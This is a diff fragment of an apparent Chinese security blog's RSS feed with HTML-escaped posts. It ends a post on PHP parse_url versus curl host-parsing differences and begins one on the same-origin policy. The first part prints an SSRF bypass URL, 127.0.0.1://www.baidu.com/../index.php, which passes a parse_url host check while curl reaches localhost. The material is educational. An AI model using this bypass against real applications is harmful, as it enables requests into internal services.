+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;parse_url 识别的 host 为 www.baidu.com 但是 curl 请求会认为是 127.0.0.1,这就
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;可能导致问题，比如利用 parse_url 验证 host 是否为 127.0.0.1 这种内网 IP，然
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;后 用 curl 发 起 请 求 ， 就 可 能 等 导 致 ssrf 攻 击 。 比 如 ：
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;127.0.0.1://www.baidu.com/../index.php
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;这里得到的 host 是 www.baidu.com，但是 curl 实际访问的确是 127.0.0.1
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;666还有个很不错的思路，直接去搜出题人，发现会有&lt;a class=&#34;link&#34; href=&#34;https://toutiao.io/posts/kuvr3yy/preview&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;浅谈 URL 协议&lt;/a&gt; 这篇文章，那答案八九不离十在里面。&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>同源策略</title>
+        <link>https://proben1.github.io/2022/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/</link>
+        <pubDate>Tue, 17 May 2022 23:15:34 +0800</pubDate>
+        
+        <guid>https://proben1.github.io/2022/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/</guid>
+        <description>&lt;h1 id=&#34;同源策略&#34;&gt;同源策略&lt;/h1&gt;
+&lt;p&gt;同源策略限制了不同源之间如何进行资源交互，是用于隔离潜在恶意文件的重要安全机制。&lt;/p&gt;
+&lt;p&gt;emmmm其实刚学的时候纠结了好久这个东西&lt;/p&gt;
+&lt;h2 id=&#34;定义&#34;&gt;定义&lt;/h2&gt;
+
+
+
+&lt;div class=&#34;notice notice-tip&#34; &gt;
+    &lt;div class=&#34;notice-title&#34;&gt;&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; class=&#34;icon notice-icon&#34; viewBox=&#34;0 0 512 512&#34;&gt;&lt;path d=&#34;M504 256a248 248 0 11-496 0 248 248 0 01496 0zM227 387l184-184c7-6 7-16 0-22l-22-23c-7-6-17-6-23 0L216 308l-70-70c-6-6-16-6-23 0l-22 23c-7 6-7 16 0 22l104 104c6 7 16 7 22 0z&#34;/&gt;&lt;/svg&gt;&lt;/div&gt;&lt;p&gt;协议/主机/端口&lt;/p&gt;&lt;/div&gt;
+
+&lt;p&gt;与&lt;code&gt;http://store.company.com/dir/page.html&lt;/code&gt;进行比较：&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th style=&#34;text-align:left&#34;&gt;URL&lt;/th&gt;
+&lt;th style=&#34;text-align:left&#34;&gt;结果&lt;/th&gt;
+&lt;th style=&#34;text-align:left&#34;&gt;原因&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;http://store.company.com/dir2/other.html&lt;/code&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;同源&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;只有路径不同&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;http://store.company.com/dir/inner/another.html&lt;/code&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;同源&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;只有路径不同&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;https://store.company.com/secure.html&lt;/code&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;失败&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;协议不同&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;http://store.company.com:81/dir/etc.html&lt;/code&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;失败&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;端口不同 ( &lt;code&gt;http://&lt;/code&gt; 默认端口是80)&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;http://news.company.com/dir/other.html&lt;/code&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;失败&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;主机不同&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
 </description>
         </item>
         <item>
